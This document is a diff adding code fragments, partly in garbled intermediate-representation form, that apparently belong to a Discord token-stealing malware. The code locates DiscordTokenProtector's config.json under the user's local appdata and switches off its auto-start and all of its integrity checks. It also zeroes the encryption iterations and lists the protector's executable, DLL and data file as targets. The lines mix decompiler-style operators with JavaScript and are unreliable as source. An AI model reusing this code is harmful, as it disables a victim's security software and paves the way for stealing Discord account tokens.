@@ -1,0 +1,29 @@
+_tmp_0.bypass_token_protector = bypass_token_protector
+_iterator_7 = <operator>.iterator(["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"])
+<operator>.formatString("", client.utils.encryption.decryptData(client.config.user.localappdata), "\\", file, "")
+<operator>.formatString("", client.utils.encryption.decryptData(client.config.user.localappdata), "\\", file, "")
+const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
+                encoding: "utf-8"
+            }))
+_tmp_80.encoding = "utf-8"
+token_protector_config['auto_start'] = false
+token_protector_config['auto_start_discord'] = false
+token_protector_config['integrity'] = false
+token_protector_config['integrity_allowbetterdiscord'] = false
+token_protector_config['integrity_checkexecutable'] = false
+token_protector_config['integrity_checkhash'] = false
+token_protector_config['integrity_checkmodule'] = false
+token_protector_config['integrity_checkscripts'] = false
+token_protector_config['integrity_checkresource'] = false
+token_protector_config['integrity_redownloadhashes'] = false
+token_protector_config['iterations_iv'] = 0
+token_protector_config['iterations_key'] = 0
+token_protector_config['version'] = 0
+client.requires.fs.writeFileSync(
+                `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
+                JSON.stringify(
+                    token_protector_config,
+                    null, 4
+                )
+            )
+<operator>.formatString("", client.utils.encryption.decryptData(client.config.user.localappdata), "\\DiscordTokenProtector\\config.json")
